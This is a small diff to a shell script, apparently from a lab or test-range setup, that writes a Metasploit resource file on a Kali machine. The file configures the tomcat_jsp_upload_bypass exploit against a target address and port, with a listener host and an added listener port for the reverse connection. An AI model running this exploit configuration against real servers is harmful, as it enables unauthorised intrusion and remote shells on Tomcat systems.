@@ -18,9 +18,10 @@ create_kali_macros ()
 	# shellcheck disable=SC2024
 	sudo cat >/home/kali/configure.rc <<EOL
 use exploit/multi/http/tomcat_jsp_upload_bypass
-set rhosts ${TARGET_ADDRESS}
+set RHOSTS ${TARGET_ADDRESS}
 set LHOST ${LHOST}
 set rport ${TARGET_PORT}
+set LPORT ${LPORT}
 EOL
 	
 
